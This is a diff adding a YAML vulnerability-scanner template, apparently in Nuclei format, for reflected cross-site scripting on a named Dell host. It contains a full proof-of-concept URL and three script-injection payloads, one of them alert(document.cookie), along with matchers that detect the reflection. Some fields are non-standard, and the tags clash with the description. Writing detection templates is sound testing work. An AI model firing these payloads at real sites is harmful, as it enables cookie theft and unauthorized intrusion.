@@ -1,0 +1,43 @@
+id: dell-mytoken-ext-xss
+
+info:
+  name: Dell mytoken-ext XSS
+  author: Vulnpire
+  severity: high
+  description: Reflected XSS in multiple parameters in mytoken-ext.ins.dell.com
+  reference: https://mytoken-ext.ins.dell.com/?cat=%27%3E%22%3Csvg%2Fonload%3Dconfirm(%27xss%27)%3E&category_id=%27%3E%22%3Csvg%2Fonload%3Dconfirm(%27xss%27)%3E&copy=%27%3E%22%3Csvg%2Fonload%3Dconfirm(%27xss-copy%27)%3E&group_id=%27%3E%22%3Csvg%2Fonload%3Dconfirm(%27xss%27)%3E&history=%27%3E%22%3Csvg%2Fonload%3Dconfirm(%27xss%27)%3E&list=%27%3E%22%3Csvg%2Fonload%3Dconfirm(%27xss-list%27)%3E&metakeyselect=%27%3E%22%3Csvg%2Fonload%3Dconfirm(%27xss%27)%3E&ns=%27%3E%22%3Csvg%2Fonload%3Dconfirm(%27xss-ns%27)%3E&product_id=%27%3E%22%3Csvg%2Fonload%3Dconfirm(%27xss%27)%3E&status=%27%3E%22%3Csvg%2Fonload%3Dconfirm(%27xss%27)%3E%22%3E%3CSvG%2Fonload%3Dalert(document.cookie)+id%3Dxss%3E&sticky=%27%3E%22%3Csvg%2Fonload%3Dconfirm(%27xss%27)%3E&subject=%27%3E%22%3Csvg%2Fonload%3Dconfirm(%27xss%27)%3E&val=%27%3E%22%3Csvg%2Fonload%3Dconfirm(%22xss%22)%3E&what=%27%3E%22%3Csvg%2Fonload%3Dconfirm(%27xss%27)%3E
+
+requests:
+  - method: GET
+    path:
+      - "/?cat={{payload}}&category_id={{payload}}&copy={{payload}}&group_id={{payload}}&history={{payload}}&list={{payload}}&metakeyselect={{payload}}&ns={{payload}}&product_id={{payload}}&status={{payload}}&sticky={{payload}}&subject={{payload}}&val={{payload}}&what={{payload}}"
+
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
+
+payloads:
+  - payload: "%27%3E%22%3Csvg%2Fonload%3Dconfirm(%27xss%27)%3E"
+  - payload: "%27%3E%22%3Csvg%2Fonload%3Dalert(document.cookie)%3E"
+  - payload: "%27%3E%22%3Cscript%3Ealert(%27xss%27)%3C%2Fscript%3E"
+
+extractors:
+  - type: regex
+    part: body
+    regex:
+      - "confirm\\('xss'\\)"
+      - "alert\\(document.cookie\\)"
+      - "alert\\('xss'\\)"
+
+matcher:
+  - type: regex
+    part: body
+    regex:
+      - "confirm\\('xss'\\)"
+      - "alert\\(document.cookie\\)"
+      - "alert\\('xss'\\)"
+
+tags:
+  - xss
+  - stored-xss
+  - dell
+  - mytoken-ext
